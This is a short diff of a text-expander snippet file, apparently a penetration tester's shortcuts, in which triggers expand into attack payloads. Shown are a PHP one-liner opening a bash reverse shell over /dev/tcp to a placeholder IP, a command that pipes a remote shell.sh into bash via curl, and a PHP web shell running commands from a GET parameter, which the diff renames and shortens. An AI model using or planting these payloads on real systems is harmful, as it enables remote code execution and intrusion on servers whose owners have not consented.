@@ -128,8 +128,8 @@ matches:
 
   - trigger: ":rphp"
     replace: <?php shell_exec("bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'"); ?>
-  - trigger: ":webphp"
-    replace: <?php echo shell_exec($_GET['cmd']); ?>
+  - trigger: ":wphp"
+    replace: <?php system($_GET['c']);?>
     
   - trigger: ":rcurl"                                                           
     replace: curl http://{{IP}}/shell.sh | bash
